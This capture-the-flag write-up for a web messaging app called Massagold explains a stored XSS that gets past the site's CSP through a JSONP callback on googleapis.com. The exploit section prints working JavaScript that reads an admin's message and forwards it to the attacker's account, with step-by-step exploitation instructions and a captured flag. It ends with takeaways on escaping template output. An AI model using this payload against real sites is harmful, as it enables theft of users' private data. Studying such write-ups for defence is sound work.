---
name: Massagold
type: Web App (Express.js + nginx)
difficulty: medium
---
# Massagold write-up
- **Goal:** exfiltrate the first message from the admin inbox.
- The [challenge.zip](./challenge.zip) contains the application.

## 1. Initial Reconnaissance
The landing page is a simple login/register portal called Rookery.

- Server: `nginx/1.26.3`
- Framework: `Express.js (X-Powered-By: Express)`

### Routes
- Main routes discovered manually and with Gobuster:
    - `/login` (GET/POST)
    - `/register` (GET/POST)
    - `/messages` (POST - create message)
    - `/messages/new` (GET - compose form)
    - `/messages/<id>` (GET - view message)
    - `/assets/*` (static files, e.g. message.js)

A basic curl test against /login with JSON body returned 400 Bad Request and an HTML login form, confirming the app expects form‑encoded data, not JSON.

```shell
curl -v -X POST -d '{"username":"test", "password":"test"}' http://<target-ip>:<target-port>/login
```

### HTTP Header analysis
The application enforces a strict CSP:

```http
Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self' https://www.googleapis.com; 
    style-src 'self'; 
    img-src 'self' data:;
    font-src 'self' data:;
    connect-src 'self';
    object-src 'none';
    form-action 'self';
    frame-ancestors 'none'
```

#### Observations
- Script execution is limited to;
    - Same Origin (`'self'`)
    - `https://www.googleapis.com`
- No inline scripts / event handlers are allowed by default
- Missing headers:
    - `X-Content-Type-Options`
    - `Referrer-Policy`
    - `Permissions-Policy`
    - `Strict-Transport-Security` (but the app is HTTP only in this challenge) 
- This CSP suggests possible XSS vector via JSONP - script inlcusion from `https://www.googleapis.com`.

### Functionality Overview
The core functionality is a simple messaging system, accessible with valid credentials (possible register / login).

#### The core focus area:
- `/messages/new`: compose a new message (HTML Content allowed)
- `/messages`: endpoint for sending a message to a recipient
    - Payload structure: `to_username=<username>&content=<html-encoded-content>`
    - Example request:
```http
POST /messages HTTP/1.1
Host: TARGET
Content-Length: 68
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://TARGET
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: <--->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://IP:PORT/messages/new
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3AwNF73BVinRSYFiyDT5abJVdX7RDlF3j7.NS7ldUonjPscKqJ7uNzJoAj%2Bi0vK2gvqzBYb6YIf6mg
Connection: keep-alive

to_username=test&content=Hi+there%2C+I%27m+gonna+hijack+your+cookies
```

- `/messages/<id>`: view a specific message
    - Content is rendered inside a `<pre class="letter-copy">` element.
    - The page includes `/assets/message.js`, which only handles UI (seal/unseal animation).
    - possible attack vector via IDOR

#### Observations
- Messages accept HTML content body
- The message view page is where any stored XSS would execute in the context of the recipient.
- There is no obvious IDOR on a small ID set (tested 0-20)

## 2. Vulnerability Discovery
- **Stored XSS via JSONP callback**
- includes CSP bypass

### Stored XSS
- Another account was created to which were test messages sent.
- The test messages confirmed that a stored XSS is possible:
    - The message content contained a html tag: `<b>...</b>` which was directly appied in the recipient's DOM. 

### CSP Bypass strategy
- Known information:
    - Inline scripts and event handlers are blocked
    - `script-src` allows `https://www.googleapis.com`

#### Finding a `googleapis` endpointNext 
Find a `googleapis` endpoint accepting a callback parameter and returning an executable javascript.
- Tested endpoints:
    - `https://maps.googleapis.com/maps/api/js?callback=alert`
    - `https://www.googleapis.com/discovery/v1/apis?callback=<fn>`
    - `https://www.googleapis.com/books/v1/volumes?q=test&callback=<fn>`

#### Finding available global javascript functions
Using the browser console on the message view page, the available global functions were enumerated:

```js
Object.keys(window).filter(k => typeof window[k] === 'function')
```

This revealed some obfuscated function names like `a4_0x16c5`, `a1_0x5336ab`, etc., plus **standard globals** (**alert**, **fetch**, **XMLHttpRequest**, location, document, etc.).

#### Test of JSONP stored XSS attack feasibility
- The `script` tag containing a JSONP callback source reference was injected into the message content.
```html
<script src="https://www.googleapis.com/discovery/v1/apis?callback=alert"></script>
```
- This approach worked, confirming that JSONP from Google can execute in this context.

## 3. Exploit
**Objective:** Inject a payload into a message so that when the target user opens it, their browser:
1. Reads a specific message (e.g. `/messages/1`).
2. Extracts the content (the flag, sensitive data or the whole message).
3. Sends that content to the attacker via the app's own /messages endpoint.

Because the app uses session cookies (connect.sid), any request from the victim's browser to /messages will be directly authenticated as the victim.

**Constraints:**
- JSONP callback parameter only allows: letters, digits, _, $, ., [, ].
- No complex expressions directly in the callback name.
- Need to stay within valid JS syntax once the JSONP response is executed.

### Working Exploit
Use a JSONP call from googleapis.com that executes a small script which:
- Fetches a target message via XMLHttpRequest (with credentials).
- Parses the HTML to extract .letter-copy content.
- Sends the extracted text in a new message to the attacker using another XMLHttpRequest.

Final payload structure (minified for inclusion in the callback):

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/messages/1', true);
xhr.withCredentials = true;

xhr.onload = function () { 
    var xhr2 = new XMLHttpRequest();
    
    xhr2.open('POST', '/messages', true);
    xhr2.withCredentials = true;
    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr2.send(''.concat('to_username=', 'test', atob('Jg=='), 'content=', btoa(new DOMParser()
        .parseFromString(xhr.responseText, 'text/html')
            .querySelector('.letter-copy').textContent)
    )); 
}; 

xhr.send();
```

- **Script summary:** When the victim opens the malicious message, this script runs in their session, reads message 1, and forwards its content (base64‑encoded) to the attacker user test.

- The callback needs to be URL encoded, currently shown expanded for clarity.
- The callback is then included into the `script` tag `src`
```html
<script src="https://www.googleapis.com/books/v1/volumes?q=test&callback=<PAYLOAD>"></script>
```

### Exploitation Steps
1. Register an account:
2. Send a message to the target user with the payload:
    - In the compose form (/messages/new), set:
        - to_username: admin
        - content: the `<script src="...">` JSONP payload.
3. Wait for the victim to open the message.
    -  When they visit `/messages/<id>`:
        - The browser loads the JSONP script from googleapis.com.
        - The script executes in the victim's context.
        - It fetches `/messages/1`, extracts the letter content, and posts it to `/messages` addressed to attacker.
4. Check your inbox.
    - As an attacker, you receive a new message containing the base64‑encoded content of the victim's message. Decode it to retrieve the flag.

### Flag
After decoding the exfiltrated message content, the flag was:
```txt
HTB{m3554g3_1n_7h3_cu570dy_ch41n_2b47dc9ffdd52f5182005a2f6f48ba2a}
```

## 4. Key Takeaways
- **The core vulnerability is a stored XSS** caused by unsafe template construction in Express.js:
    - User-supplied message content is rendered into the HTML response without proper sanitization or escaping. 
    - Using `<%- %>` instead of `<%= %>` in EJS templates causes the content to be inserted raw, resulting in stored XSS attack vector.
    - The server allows HTML in messages and inserts this content directly into the page (e.g. inside `.letter-copy`), enabling injection of `<script src="...">` tags.
    - Combined with the CSP that permits `script-src 'self' https://www.googleapis.com`, this allows an attacker to load and execute arbitrary JavaScript via JSONP from Google APIs.

- **CSP with external script allowances** (like googleapis.com) can be abused via JSONP to achieve XSS even when inline scripts are blocked.
    - Inline `<script>` and `onload=` handlers are rejected by CSP.
    - However, `<script src="https://www.googleapis.com/...?callback=...">` is allowed and executes in the victim's context.

- **Stored XSS in a messaging system** is especially powerful when:
    - Messages are rendered in the victim's authenticated session.
    - The app itself provides an authenticated endpoint (like `/messages`) that can be used for exfiltration.
    - Using the app's own functionality for exfiltration (sending a message) keeps everything `same‑origin` and avoids additional CSP issues with `connect-src`.
